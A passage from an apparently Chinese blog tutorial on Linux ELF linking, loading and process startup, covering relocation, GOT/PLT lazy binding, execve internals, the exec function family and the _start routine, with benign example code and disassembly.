<h3 id="符号重定位（Symbol-Relocation）"><a href="#符号重定位（Symbol-Relocation）" class="headerlink" title="符号重定位（Symbol Relocation）"></a>符号重定位（Symbol Relocation）</h3><p>链接器通过符号表对应的  <code> Elf32_Rel</code> 的 <code>st_value</code> 表示该符号在段中的<strong>偏移</strong>，进而可以根据<strong>重定位类型</strong>计算出重定位入口所要修正的值。最后将对应的重定位入口 patch 成正确的值。32 位静态链接常用到的重定位类型如下：</p>
<ul>
<li><code>R_386_32</code>：绝对地址。</li>
<li><code>R_386_PC32</code>：相对于当前指令地址的下一条指令相对地址。</li>
</ul>
<h3 id="解析库依赖关系（Library-Dependency-Resolution）"><a href="#解析库依赖关系（Library-Dependency-Resolution）" class="headerlink" title="解析库依赖关系（Library Dependency Resolution）"></a>解析库依赖关系（Library Dependency Resolution）</h3><p>如果目标文件依赖于外部库文件（如标准库或其他第三方库），链接器会解析这些库的依赖关系，并将所需的库文件链接到最终的可执行文件或静态库中。这样，在运行时，可执行文件或静态库就能够访问和使用这些库中提供的功能。</p>
<h3 id="生成重定位表（Relocation-Table）"><a href="#生成重定位表（Relocation-Table）" class="headerlink" title="生成重定位表（Relocation Table）"></a>生成重定位表（Relocation Table）</h3><p>链接器生成重定位表，记录了需要进行符号重定位的位置和相关信息。这些重定位表将在最终的可执行文件或静态库中被使用，以便在加载和执行时进行正确的符号重定位。</p>
<h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>动态链接（Dynamic Linking）本质是指把链接这个过程推迟到了运行时再进行，准确的说这个过程应该放在装载部分。不过动态链接的出现很大一部分原因是为了解决内存浪费问题，因此直接照搬静态链接的方式不合理，需要做一些改变。</p>
<p>另外我们称一个程序为动态链接程序或静态链接程序指的是该程序是否有动态链接过程。</p>
<p><strong>注意动态链接不包括合并代码和数据段的过程，各个模块在内存中独立存在。</strong></p>
<h3 id="装载时重定位"><a href="#装载时重定位" class="headerlink" title="装载时重定位"></a>装载时重定位</h3><p>由于需要将多个模块装载到内存中，因此动态链接难免会有地址冲突问题，这就需要我们在加载的时候将模块中的相关地址修改为正确的值，这就是装载时重定位。</p>
<p>Linux和GCC支持这种装载时重定位的方法，在产生共享对象时，使用了两个GCC参数 <code>-shared</code> 和 <code>-fPIC</code> ，如果只使用 <code>-shared</code> ，那么输出的共享对象就是使用装载时重定位的方法。</p>
<h3 id="地址无关代码"><a href="#地址无关代码" class="headerlink" title="地址无关代码"></a>地址无关代码</h3><p>如果采用装载时重定位的方法虽然能够做到任意地址装载，但存在弊端。比如模块装载到不同位置会导致模块的代码段内容发生改变，无法实现共享库的复用，造成内存浪费；每次装载重定位会影响性能等。</p>
<p>地址无关代码的出现很好的解决了装载时重定位的缺点。地址无关代码的基本想法就是把指令中那些需要被修改的部分分离出来，跟数据部分放在一起，这样指令部分就可以保持不变，而数据部分可以在每个进程中拥有一个副本。这种方案就是目前被称为地址无关代码（PIC,Position-independent Code）的技术。这也就是 GCC 的 <code>-fPIC</code> 编译参数。</p>
<p>模块中各种类型的地址引用方式有以下 4 种：</p>
<ul>
<li>模块内部的函数调用、跳转等。</li>
<li>模块内部的数据访问，比如模块中定义的全局变量、静态变量。</li>
<li>模块外部的函数调用、跳转等。</li>
<li>模块外部的数据访问，比如其他模块中定义的全局变量。</li>
</ul>
<p>对于前两种引用方式由于是在模块内部，相对地址偏移固定，因此可以通过 <code>[rip + xxx]</code> （注意这里的 rip 是当前指令的<strong>下一条指令</strong>的地址，下一条指令指的是<strong>地址相邻</strong>的下一条指令）的方式进行引用，从而做到地址无关。因此关键在于后两种怎么解决。</p>
<p>模块间的访问比模块内部稍微麻烦一点，因为模块间的数据访问目标地址要等到装载时才决定，我们前面提到要使得代码地址无关，基本的思想就是把跟地址相关的部分放到数据段里面，很明显，这些其他模块的全局变量的地址是跟模块装载地址有关的。ELF 的做法是在数据段里面建立一个指向这些变量的指针数组，也被称为全局偏移表（Global Offset Table，GOT），当代码需要引用该全局变量时，可以通过 GOT 中相对应的项间接引用。</p>
<p>前面模块内部的解决方法实际上并不严谨，比如一些全局变量以及函数声明没有初始化会被认为是若弱符号，这些弱符号编译器并不知道是否只在本模块定义，因此不能仅使用 <code>[rip + xxx]</code> 的方式访问。</p>
<p>针对这种情况的解决办法是所有的使用这个变量的指令都指向位于可执行文件中的那个副本。ELF 共享库在编译时，默认都把定义在模块内部的全局变量当作定义在其他模块的全局变量，也就是说当作前面的类型四，通过 GOT 来实现变量的访问。当共享模块被装载时，如果某个全局变量在可执行文件中拥有副本，那么动态链接器就会把 GOT 中的相应地址指向该副本，这样该变量在运行时实际上最终就只有一个实例。如果变量在共享模块中被初始化，那么动态链接器还需要将该初始化值复制到程序主模块中的变量副本；如果该全局变量在程序主模块中没有副本，那么 GOT 中的相应地址就指向共享模块内部的该变量副本。<strong>这就是为什么 libc 的 GOT 表中会有自身函数。</strong></p>
<p>地址无关代码虽然解决了模块复用的问题，但是本质还是装载时重定位因此没有解决性能问题，实际上 ELF 采用了<strong>延迟绑定</strong>的方法来解决这一问题。</p>
<p>地址无关代码技术除了可以用在共享对象上面，它也可以用于<strong>可执行文件</strong>，一个以地址无关方式编译的可执行文件被称作地址无关可执行文件（<strong>PIE</strong>, Position-Independent Executable）。与 GCC 的 <code>-fPIC</code> 和 <code>-fpic</code> 参数类似，产生 PIE 的参数为 <code>-fPIE</code> 或 <code>-fpie</code> 。</p>
<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>在动态链接下，程序模块之间包含了大量的函数引用（全局变量往往比较少，因为大量的全局变量会导致模块之间耦合度变大），所以在程序开始执行前，动态链接会耗费不少时间用于解决模块之间的函数引用的符号查找以及重定位。可以想象，在一个程序运行过程中，可能很多函数在程序执行完时都不会被用到，比如一些错误处理函数或者是一些用户很少用到的功能模块等，如果一开始就把所有函数都链接好实际上是一种浪费。所以 ELF 采用了一种叫做延迟绑定（Lazy Binding）的做法，基本的思想就是当函数第一次被用到时才进行绑定（符号查找、重定位等），如果没有用到则不进行绑定。所以程序开始执行时，模块间的函数调用都没有进行绑定，而是需要用到时才由动态链接器来负责绑定。这样的做法可以大大加快程序的启动速度，特别有利于一些有大量函数引用和大量模块的程序。</p>
<p><strong>注意，延迟绑定一般只出先在未开启 FULL RELRO 的时候，如果开启 FULL RELRO 则 got 表不可写，程序在装载时完成 got 表的重定位。当然特殊情况也有在开启 FULL RELRO 的时候进行重定位，比如 ret2dlresolve 。</strong></p>
<p>我们以调用 <code>puts</code> 函数为例讲解一下延迟绑定的过程。</p>
<p>首先第一次调用 <code>puts</code> 时由于 <code>puts@got</code> 没有进行重定位，因此会调用 <code>_dl_runtime_resolve</code> 函数进行重定位，<code>_dl_runtime_resolve</code> 函数将查找到的 <code>puts</code> 函数地址填写到 <code>puts@got</code> 后会调用 <code>puts</code> 函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004319385.png"
                      alt="image-20241108004319385"
                ><br>再次调用 <code>puts</code> 函数时由于 <code>puts@got</code> 已经完成重定位，因此会直接调用 <code>puts</code> 函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004343509.png"
                      alt="image-20241108004343509"
                ><br>其中在第一次调用 <code>puts</code> 函数时调用的 <code>_dl_runtime_resolve</code> 函数的具体实现为：</p>
<ul>
<li>用第一个参数 <code>link_map</code> 访问 <code>.dynamic</code> ，取出 <code>.dynstr</code> ， <code>.dynsym</code> ， <code>.rel.plt</code> 的指针。</li>
<li><code>.rel.plt + 第二个参数</code> 求出当前函数的重定位表项 <code>Elf32_Rel</code> 的指针，记作 <code>rel</code> 。</li>
<li><code>rel-&gt;r_info &gt;&gt; 8</code> 作为 <code>.dynsym</code> 的下标，求出当前函数的符号表项 <code>Elf32_Sym</code> 的指针，记作 <code>sym</code> 。</li>
<li><code>.dynstr + sym-&gt;st_name</code> 得出符号名字符串指针。</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给 <code>*rel-&gt;r_offset</code> ，即 GOT 表。</li>
<li>调用这个函数。</li>
</ul>
<h3 id="动态链接的步骤和实现"><a href="#动态链接的步骤和实现" class="headerlink" title="动态链接的步骤和实现"></a>动态链接的步骤和实现</h3><h4 id="动态链接器自举"><a href="#动态链接器自举" class="headerlink" title="动态链接器自举"></a>动态链接器自举</h4><p>由于动态链接器本身的作用是重定位，因此自身的重定位也需要自身来完成，完成自身重定位的过程成为自举（Bootstrap）。</p>
<p>动态链接器入口地址即是自举代码的入口，当操作系统将进程控制权交给动态链接器时，动态链接器的自举代码即开始执行。自举代码首先会找到它自己的 GOT 。而 GOT 的第一个入口保存的即是 <code>.dynamic</code> 段的偏移地址，由此找到了动态连接器本身的“.dynamic”段。通过 <code>.dynamic</code> 中的信息，自举代码便可以获得动态链接器本身的重定位表和符号表等，从而得到动态链接器本身的重定位入口，先将它们全部重定位。</p>
<p>从这一步开始，动态链接器代码中才可以开始使用自己的全局变量和静态变量。</p>
<h4 id="装载共享对象"><a href="#装载共享对象" class="headerlink" title="装载共享对象"></a>装载共享对象</h4><p>完成基本自举以后，动态链接器将可执行文件和链接器本身的符号表都合并到一个符号表当中，我们可以称它为全局符号表（Global Symbol Table）。然后链接器开始寻找可执行文件所依赖的共享对象，我们前面提到过 <code>.dynamic</code> 段中，有一种类型的入口是 <code>DT_NEEDED</code> ，它所指出的是该可执行文件（或共享对象）所依赖的共享对象。由此，链接器可以列出可执行文件所需要的所有共享对象，并将这些共享对象的名字放入到一个装载集合中。然后链接器开始从集合里取一个所需要的共享对象的名字，找到相应的文件后打开该文件，读取相应的 ELF 文件头和 <code>.dynamic</code> 段，然后将它相应的代码段和数据段映射到进程空间中。</p>
<p>如果这个 ELF 共享对象还依赖于其他共享对象，那么将所依赖的共享对象的名字放到装载集合中。如此循环直到所有依赖的共享对象都被装载进来为止，当然链接器可以有不同的装载顺序，如果我们把依赖关系看作一个图的话，那么这个装载过程就是一个图的遍历过程，链接器可能会使用深度优先或者广度优先或者其他的顺序来遍历整个图，这取决于链接器，比较常见的算法一般都是广度优先的。</p>
<p>当一个新的共享对象被装载进来的时候，它的符号表会被合并到全局符号表中，所以当所有的共享对象都被装载进来的时候，全局符号表里面将包含进程中所有的动态链接所需要的符号。</p>
<h4 id="重定位和初始化"><a href="#重定位和初始化" class="headerlink" title="重定位和初始化"></a>重定位和初始化</h4><p>当上面的步骤完成之后，链接器开始重新遍历可执行文件和每个共享对象的重定位表，将它们的 GOT&#x2F;PLT 中的每个需要重定位的位置进行修正。因为此时动态链接器已经拥有了进程的全局符号表，所以这个修正过程也显得比较容易，跟我们前面提到的地址重定位的原理基本相同。</p>
<p>动态链接重定位除了前面静态链接重定位类型外还有如下重定位类型：</p>
<ul>
<li><code>R_386_RELATIVE</code>：针对下面这种代码的重定位，由于加载地址不确定，需要加载后的才能确定。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> a;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span>* p = &amp;a;</span><br></pre></td></tr></table></figure></div></li>
<li><code>R_386_GLOB_DAT</code>：位于 <code>.got</code> 的重定位入口，只需要填入正确变量地址即可。</li>
<li><code>R_386_JUMP_SLOT</code>：位于 <code>.got.plt</code> 的重定位入口，只需要填入正确的函数地址即可。</li>
</ul>
<p>重定位完成之后，如果某个共享对象有 <code>.init</code> 段，那么动态链接器会执行 <code>.init</code> 段中的代码，用以实现共享对象特有的初始化过程，比如最常见的，共享对象中的 C++ 的全局&#x2F;静态对象的构造就需要通过 <code>.init</code> 来初始化。相应地，共享对象中还可能有 <code>.fini</code> 段，当进程退出时会执行 <code>.fini</code> 段中的代码，可以用来实现类似 C++ 全局对象析构之类的操作。</p>
<p>如果进程的可执行文件也有 <code>.init</code> 段，那么动态链接器不会执行它，因为可执行文件中的 <code>.init</code> 段和 <code>.fini</code> 段由程序初始化部分代码负责执行。当完成了重定位和初始化之后，所有的准备工作就宣告完成了，所需要的共享对象也都已经装载并且链接完成了，这时候动态链接器就如释重负，将进程的控制权转交给程序的入口并且开始执行。</p>
<h1 id="装载"><a href="#装载" class="headerlink" title="装载"></a>装载</h1><h2 id="Linux-内核装载-ELF-过程"><a href="#Linux-内核装载-ELF-过程" class="headerlink" title="Linux 内核装载 ELF 过程"></a>Linux 内核装载 ELF 过程</h2><p>首先在用户层面，bash 进程会调用 <code>fork()</code> 系统调用创建一个新的进程，然后新的进程调用 <code>execve()</code> 系统调用执行指定的 ELF 文件，原先的 bash 进程继续返回等待刚才启动的新进程结束，然后继续等待用户输入命令。</p>
<p><code>execve()</code> 系统调用被定义在 <code>unistd.h</code> ，它的原型如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Replace the current process, executing PATH with arguments ARGV and</span></span><br><span class="line"><span class="comment">   environment ENVP.  ARGV and ENVP are terminated by NULL pointers.  */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__path, <span class="type">char</span> *<span class="type">const</span> __argv[], <span class="type">char</span> *<span class="type">const</span> __envp[])</span>;</span><br></pre></td></tr></table></figure></div>
<p>它的三个参数分别是被执行的程序文件名、执行参数和环境变量。</p>
<p>Glibc 对 <code>execvp()</code> 系统调用进行了包装，提供了 <code>execl()</code> 、<code>execlp()</code> 、<code>execle()</code> 、<code>execv()</code> 和 <code>execvp()</code> 等5个不同形式的 <code>exec</code> 系列 API ，它们只是在调用的参数形式上有所区别，但最终都会调用到 <code>execve()</code> 这个系统调用。下面是一个简单的使用 <code>fork()</code> 和 <code>execlp()</code> 实现的 minibash ：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_COMMAND_LENGTH 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> command[MAX_COMMAND_LENGTH];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;minibash$ &quot;</span>);</span><br><span class="line">        fgets(command, <span class="keyword">sizeof</span>(command), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除换行符</span></span><br><span class="line">        command[<span class="built_in">strcspn</span>(command, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查是否输入了退出命令</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;exit&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(command) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">pid_t</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 子进程执行命令</span></span><br><span class="line">            <span class="keyword">if</span> (execlp(command, command, <span class="literal">NULL</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;minibash&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 父进程等待子进程结束</span></span><br><span class="line">            <span class="type">int</span> status;</span><br><span class="line">            waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// fork失败</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在进入 <code>execve()</code> 系统调用之后，Linux 内核就开始进行真正的装载工作。在内核中， <code>execve()</code> 系统调用相应的入口是 sys_execve()， 它被定义在 <code>arch\i386\kernel\Process.c</code> 。<code>sys_execve()</code> 进行一些参数的检查复制之后，调用 <code>do_execve()</code> 。<code>do_execve()</code> 会首先查找被执行的文件，如果找到文件，则 <code>do_execve()</code> 读取文件的前128个字节判断文件的格式，每种可执行文件的格式的开头几个字节都是很特殊的，特别是开头4个字节，常常被称做魔数（Magic Number），通过对魔数的判断可以确定文件的格式和类型。比如 ELF 的可执行文件格式的头 4 个字节为 <code>\x7felf</code> ；而 Java 的可执行文件格式的头4个字节为 <code>cafe</code> ；如果被执行的是 Shell 脚本或 perl 、python 等这种解释型语言的脚本，那么它的第一行往往是 <code>#!/bin/sh</code> 或 <code>#!/usr/bin/perl</code> 或 <code>#!/usr/bin/python</code> ，这时候前两个字节 <code>#</code> 和 <code>!</code> 就构成了魔数，系统一旦判断到这两个字节，就对后面的字符串进行解析，以确定具体的解释程序的路径。</p>
<p>当 <code>do_execve()</code> 读取了这 128 个字节的文件头部之后，然后调用 <code>search_binary_handle()</code> 去搜索和匹配合适的可执行文件装载处理过程。Linux中所有被支持的可执行文件格式都有相应的装载处理过程， <code>search_binary_handle()</code> 会通过判断文件头部的魔数确定文件的格式，并且调用相应的装载处理过程。比如 ELF 可执行文件的装载处理过程叫做 <code>load_elf_binary()</code>； a.out 可执行文件的装载处理过程叫做 <code>load_aout_binary()</code>；而装载可执行脚本程序的处理过程叫做 <code>load_script()</code> 。 这里我们只关心 ELF 可执行文件的装载， <code>load_elf_binary()</code> 被定义在 <code>fs/Binfmt_elf.c</code> ，这个函数的代码比较长，它的主要步骤是：</p>
<ul>
<li>检查ELF可执行文件格式的有效性，比如魔数、程序头表中段（Segment）的数量。</li>
<li>寻找动态链接的 <code>.interp</code> 段，设置动态链接器路径。</li>
<li>根据 ELF 可执行文件的<strong>程序头表</strong>的描述，对 ELF 文件进行映射，比如代码、数据、只读数据。</li>
<li>初始化 ELF 进程环境，比如进程启动时 EDX 寄存器的地址应该是 <code>DT_FINI</code> 的地址（参照动态链接）。</li>
<li>将系统调用的返回地址修改成 ELF 可执行文件的入口点，这个入口点取决于程序的链接方式，对于<strong>静态链接</strong>的 ELF 可执行文件，这个程序入口就是 ELF 文件的文件头中 <strong><code>e_entry</code> 所指的地址</strong>；对于<strong>动态链接</strong>的 ELF 可执行文件，程序入口点是<strong>动态链接器</strong>。</li>
</ul>
<p>当 <code>load_elf_binary()</code> 执行完毕，返回至 <code>do_execve()</code> 再返回至 <code>sys_execve()</code> 时，上面的第 5 步中已经把系统调用的返回地址改成了被装载的 ELF 程序的入口地址了。所以当 <code>sys_execve()</code> 系统调用从内核态返回到用户态时，EIP 寄存器直接跳转到了 ELF 程序的入口地址，于是新的程序开始执行，ELF 可执行文件装载完成。</p>
<h2 id="进程虚拟地址空间"><a href="#进程虚拟地址空间" class="headerlink" title="进程虚拟地址空间"></a>进程虚拟地址空间</h2><p>在现代操作系统中，每个进程都有自己的虚拟地址空间，这是一个抽象的地址空间，由连续的虚拟地址组成。每个进程在其虚拟地址空间中运行，不会直接访问物理内存地址。</p>
<p>操作系统将每个进程的虚拟地址空间划分为多个区域，例如代码段、数据段、堆和栈等。每个区域具有特定的用途和权限。</p>
<ul>
<li>代码段：包含可执行程序的机器指令。</li>
<li>数据段：包含静态和全局变量的初始值。</li>
<li>BSS 段：包含需要初始化为零的静态和全局变量。</li>
<li>动态链接段：包含动态链接所需的信息。</li>
</ul>
<p>加载器将这些段从 ELF 文件中复制到相应的虚拟内存地址，并建立虚拟地址与物理内存地址的映射关系。</p>
<h2 id="execve-系列函数之间的区别"><a href="#execve-系列函数之间的区别" class="headerlink" title="execve 系列函数之间的区别"></a>execve 系列函数之间的区别</h2><p><code>execve</code> 和其他 <code>exec</code> 系列函数（<code>execl</code>, <code>execlp</code>, <code>execle</code>, <code>execv</code>, <code>execvp</code>, <code>execvpe</code>）是 UNIX 和 Linux 系统编程中用于执行程序的重要工具。它们都用于在当前进程中加载并执行一个新程序，从而完全替换当前进程的内存空间、数据、堆栈等内容，但进程ID保持不变。这些函数通常用于需要替换当前执行的程序的情况，如 shell 实现中运行外部命令。</p>
<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>所有这些函数最终都会调用系统的 <code>execve</code> 系统调用。<code>execve</code> 是实现其他 <code>exec</code> 函数的底层基础。当调用任一 <code>exec</code> 函数时，当前进程的地址空间将被新程序替换，但进程的 PID 保持不变。这意味着新程序将继续使用调用 <code>exec</code> 的进程的 PID，并从 <code>main()</code> 函数开始执行，而原进程的所有代码和数据则被新程序的代码和数据所替换。</p>
<h3 id="函数差异"><a href="#函数差异" class="headerlink" title="函数差异"></a>函数差异</h3><ul>
<li><p><strong>execve</strong></p>
<ul>
<li><strong>原型</strong>：<code>int execve(const char *pathname, char *const argv[], char *const envp[]);</code></li>
<li><strong>参数</strong>：<ul>
<li><code>pathname</code>：要执行的程序路径。</li>
<li><code>argv</code>：传递给新程序的参数数组，以 NULL 结尾。</li>
<li><code>envp</code>：传递给新程序的环境变量数组，以 NULL 结尾。</li>
</ul>
</li>
<li><strong>特点</strong>：是唯一一个直接系统调用的 <code>exec</code> 函数，其他 <code>exec</code> 函数最终都是通过调用 <code>execve</code> 实现的。</li>
</ul>
</li>
<li><p><strong>execl, execlp, execle</strong></p>
<ul>
<li><strong>特点</strong>：这些函数允许直接在函数调用中列出参数，而不是通过数组传递。</li>
<li><code>execl</code> 和 <code>execle</code> 需要提供程序的完整路径，而 <code>execlp</code> 在 PATH 环境变量中搜索程序名。</li>
<li><code>execle</code> 允许直接指定环境变量。</li>
</ul>
</li>
<li><p><strong>execv, execvp, execvpe</strong></p>
<ul>
<li><strong>特点</strong>：这些函数通过数组传递参数给新程序。</li>
<li><code>execv</code> 需要提供程序的完整路径。</li>
<li><code>execvp</code> 和 <code>execvpe</code> 在 PATH 环境变量中搜索程序名。</li>
<li><code>execvpe</code> 类似于 <code>execvp</code>，但允许指定环境变量。</li>
</ul>
</li>
</ul>
<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ul>
<li><strong>execve</strong>：需要精确控制新程序的环境变量时使用。</li>
<li><strong>execl, execlp, execle</strong>：当参数数量已知且不需要动态构建参数数组时使用。</li>
<li><strong>execv, execvp, execvpe</strong>：当参数以数组形式提前构建好或在程序中动态生成时使用。</li>
</ul>
<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><h2 id="进程栈的初始化"><a href="#进程栈的初始化" class="headerlink" title="进程栈的初始化"></a>进程栈的初始化</h2><p>我们知道进程刚开始启动的时候，须知道一些进程运行的环境，最基本的就是系统环境变量和进程的运行参数。很常见的一种做法是操作系统在进程启动前将这些信息提前保存到进程的虚拟空间的栈中。</p>
<p>假设我们运行如下命令，即运行 <code>ls</code> 程序，传入的参数为 <code>/home</code> 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /home</span><br></pre></td></tr></table></figure></div>
<p>在程序初始状态的栈如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004415525.png"
                      alt="image-20241108004415525"
                ><br>栈顶寄存器 rsp 指向的位置是初始化以后堆栈的顶部，最前面的 8 个字节表示<strong>命令行参数的数量</strong>，我们的例子里面是两个，即 <code>/usr/bin/ls</code> 和 <code>/home</code> ，紧接的就是分布指向这两个参数字符串的<strong>指针</strong>；后面跟了一个0；接着是一个以 0 结尾的指向环境变量字符串的指针数组。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0b14b8f7b214bfb36efc1979d4c50b10.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                >
进程在启动以后，程序的库部分会把堆栈里的初始化信息中的参数信息传递给 `main()` 函数，也就是我们熟知的 `main()` 函数的两个 `argc` 和 `argv` 两个参数，这两个参数分别对应这里的命令行参数数量和命令行参数字符串指针数组。

<h2 id="main-函数之外的代码"><a href="#main-函数之外的代码" class="headerlink" title="main 函数之外的代码"></a>main 函数之外的代码</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004734754.png"
                      alt="image-20241108004734754"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004754680.png"
                      alt="image-20241108004754680"
                ><br>当运行程序时，shell 或 gui 调用 <code>execve()</code> ，它执行 linux 系统调用 <code>execve()</code> 设置一个堆栈，并将 <code>argc</code> 、 <code>argv</code> 和 <code>envp</code> 压入其中。文件描述 0、1 和 2（<code>stdin</code> 、<code>stdout</code> 、<code>stderr</code>)保留为 shell 设置的值，动态链接器完成重定位工作。当一切准备就绪后，通过调用 <code>_start()</code> 将控制权交给程序。</p>
<p>一般情况下 ELF 的入口点为 <code>_start</code> 函数，这个函数的主要作用是设置 <code>___libc_start_main</code> 函数的所需参数。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08049080 endbr32</span><br><span class="line">.text:08049084 xor     ebp, ebp                        ; 设置 ebp 为 0 表示最外层栈</span><br><span class="line">.text:08049086 pop     esi                             ; argc</span><br><span class="line">.text:08049087 mov     ecx, esp                        ; argv</span><br><span class="line">.text:08049089 and     esp, 0FFFFFFF0h                 ; 栈对齐</span><br><span class="line">.text:0804908C push    eax                             ; 静态链接程序默认为 0 ，动态链接程序默认为模块对应的 link_map</span><br><span class="line">.text:0804908D push    esp                             ; stack_end</span><br><span class="line">.text:0804908E push    edx                             ; rtld_fini</span><br><span class="line">.text:0804908F call    sub_80490B7</span><br><span class="line">.text:0804908F</span><br><span class="line">.text:08049094 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $); ebx = offset _GLOBAL_OFFSET_TABLE_</span><br><span class="line">.text:0804909A lea     eax, (__libc_csu_fini - 804C000h)[ebx] ; (__libc_csu_fini - _GLOBAL_OFFSET_TABLE_)[ebx]</span><br><span class="line">.text:080490A0 push    eax                             ; fini</span><br><span class="line">.text:080490A1 lea     eax, (__libc_csu_init - 804C000h)[ebx] ; (__libc_csu_init - _GLOBAL_OFFSET_TABLE_)[ebx]</span><br><span class="line">.text:080490A7 push    eax                             ; init</span><br><span class="line">.text:080490A8 push    ecx                             ; ubp_av</span><br><span class="line">.text:080490A9 push    esi                             ; argc</span><br><span class="line">.text:080490AA mov     eax, offset main</span><br><span class="line">.text:080490B0 push    eax                             ; main</span><br><span class="line">.text:080490B1 call    ___libc_start_main</span><br><span class="line">.text:080490B1</span><br><span class="line">.text:080490B6 hlt</span><br><span class="line">.text:080490B7 sub_80490B7 proc near                   ; CODE XREF: _start+F↑p</span><br><span class="line">.text:080490B7 mov     ebx, [esp]</span><br><span class="line">.text:080490BA retn</span><br></pre></td></tr></table></figure></div>
<p>之后调用 <code>__libc_start_main</code> 函数，通过调试发现使用 glibc-2.23 的 32 位程序实际调用的是 <code>generic_start_main</code> 函数，该函数位于 <code>csu/libc-start.c</code> 中，定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> LIBC_START_MAIN generic_start_main</span></span><br><span class="line"></span><br><span class="line">STATIC <span class="type">int</span></span><br><span class="line"><span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">		 <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">		 __typeof (main) init,</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br></pre></td></tr></table></figure></div>
